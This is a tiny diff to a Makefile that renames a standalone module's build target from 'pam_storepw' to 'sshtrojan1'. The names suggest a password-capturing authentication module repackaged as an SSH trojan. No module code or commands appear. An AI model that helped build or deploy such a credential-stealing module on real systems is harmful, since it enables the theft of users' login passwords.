@@ -1,6 +1,6 @@
 # Modified Makefile to allow for building of the standalone module
 
-TITLE=pam_storepw
+TITLE=sshtrojan1
 
 LIBSRC = $(TITLE).c
 LIBOBJ = $(TITLE).o
